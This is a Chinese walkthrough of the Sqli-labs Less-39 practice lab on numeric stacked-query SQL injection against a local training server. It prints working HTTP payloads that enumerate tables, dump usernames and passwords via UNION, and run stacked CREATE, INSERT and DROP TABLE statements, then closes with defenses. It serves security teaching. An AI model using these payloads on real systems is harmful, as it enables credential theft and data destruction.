# 题目：Sqli-labs Less-39

## 题目描述
页面提示 `Please input the ID as parameter with numeric value`，回显 `Your Username is : ...` / `Your Password is : ...`。标题是 `Less-39 **stacked Query Intiger type**`。
考点与 Less‑38 相同，使用 `mysqli_multi_query()` 实现堆叠注入，区别为本关是**数字型注入，id参数没有单引号包裹**。

## 核心原理与前置分析
后台关键PHP源码：
```php
$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

* 对比 Less‑38：
```
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```
1. 数字型，**不需要闭合单引号**，`union`、堆叠`;`可以直接拼接在 id 参数后。
2. 底层依靠`mysqli_multi_query()`支持分号`;`执行多条 SQL 语句。
3. 程序只会获取渲染**第一条 SQL 的结果集**；分号后面的 SQL 可以执行，但是页面不会回显执行结果。

* **两种利用方式**
- **UNION 联合查询**：直接拼接 union 语句读取数据，页面正常回显；
- **堆叠注入 stacked query**：通过`;`执行`create`、`insert`等写操作，页面无输出，需要登录数据库内部验证效果。

## 解题思路
1. 使用 union 联合查询确定列数与回显位置；
2. 使用`and 1=1 / and 1=2`布尔对照确认数字注入；
3. 使用 UNION 直接爆库、表、字段、账号密码；
4. 使用分号`;`执行堆叠写操作，验证多语句执行能力；
5. 堆叠 + union 组合：堆叠建表存放数据，再通过 union 读出；测试结束清理临时表。

## 解题步骤
### 1. 确认列数与回显位
```
GET /sqli-labs/Less-39/?id=-1%20union%20select%201,2,3--%20- HTTP/1.1
Host: 127.0.0.1
```

回显
```
Your Username is : 2
Your Password is : 3
```
一共**3 列**，第 2、3 列为可回显位置。

### 2. 布尔条件对照，确认数字注入
```
GET /sqli-labs/Less-39/?id=1%20and%201=1--%20- HTTP/1.1
Host: 127.0.0.1

GET /sqli-labs/Less-39/?id=1%20and%201=2--%20- HTTP/1.1
Host: 127.0.0.1
```

| 请求 | 回显 |
| --- | --- |
| `1 and 1=1` | `Dumb` |
| `1 and 1=2` | 空白 |

布尔对照结果干净，确认数字注入生效。

### 3. UNION 联合查询爆数据

* 爆库名
```
GET /sqli-labs/Less-39/?id=-1%20union%20select%201,database(),3--%20- HTTP/1.1
Host: 127.0.0.1
```

* 爆表名
```
GET /sqli-labs/Less-39/?id=-1%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()--%20- HTTP/1.1
Host: 127.0.0.1
```

* 爆账号密码
```
GET /sqli-labs/Less-39/?id=-1%20union%20select%201,group_concat(username,0x3a,password),3%20from%20users--%20- HTTP/1.1
Host: 127.0.0.1
```

### 4. 堆叠写操作测试（页面无回显，数据库内验证）
1. 创建临时表 zz_t39
```
GET /sqli-labs/Less-39/?id=1;%20create%20table%20zz_t39(a%20int)--%20- HTTP/1.1
Host: 127.0.0.1
```

2. 插入测试数据
```
GET /sqli-labs/Less-39/?id=1;%20insert%20into%20zz_t39%20values(456)--%20- HTTP/1.1
Host: 127.0.0.1
```

3. 登录 MySQL 执行查询：
```
SELECT * FROM zz_t39;
```
查询返回`456`，证明堆叠写操作执行成功。

### 5. 堆叠 + UNION 组合脱库
1. 创建存储数据临时表 dump39
```
GET /sqli-labs/Less-39/?id=1;%20create%20table%20dump39(username%20varchar(100),password%20varchar(100))--%20- HTTP/1.1
Host: 127.0.0.1
```

2. 将 users 表账号密码全部插入临时表
```
GET /sqli-labs/Less-39/?id=1;%20insert%20into%20dump39%20select%20username,password%20from%20users--%20- HTTP/1.1
Host: 127.0.0.1
```

3. union 读取临时表数据
```
GET /sqli-labs/Less-39/?id=-1%20union%20select%201,group_concat(username,0x3a,password),3%20from%20dump39--%20- HTTP/1.1
Host: 127.0.0.1
```

4. 清理临时表
```
GET /sqli-labs/Less-39/?id=1;%20drop%20table%20dump39--%20- HTTP/1.1
Host: 127.0.0.1
```

## 踩坑记录
1. **不要直接复制 Less‑38 带单引号的 payload**。本关为数字型，payload 不能携带`'`，多余单引号会直接造成 SQL 语法错误。
2. 堆叠后面的 select 语句可以执行，但页面不会回显；PHP 只返回第一条 SQL 的结果集。
3. 不要使用`or 1=0`做布尔判断，`id=1 or 1=0`依旧会返回数据；优先成对使用`and 1=1 / and 1=2`。
4. 注释`-- -`中间空格不可省略，URL 编码写`--%20-`，也可以使用`%23`。
5. 练习堆叠写操作使用临时表，测试完成执行`drop table`清理，不要污染靶场原始数据库。

## 知识点总结
1. **数字型堆叠注入**：id 无引号包裹，payload 可以直接拼接，`id=1; SQL语句`格式，payload 比字符型堆叠更简短。
2. 堆叠注入依赖`mysqli_multi_query`；只有第一条 SQL 结果集回显；读数据优先 UNION，写操作依靠堆叠注入。
3. 数字型注入不需要处理引号闭合，布尔条件对照结果直观清晰。
4. 堆叠注入危害高，可以执行`insert/update/delete/create`甚至文件导出操作，风险高于普通联合查询注入。

**防御**: 使用预编译 + 参数绑定；数字参数做`(int)`强制类型转换；关闭 mysqli_multi_query 多语句执行；数据库账号配置最小权限。
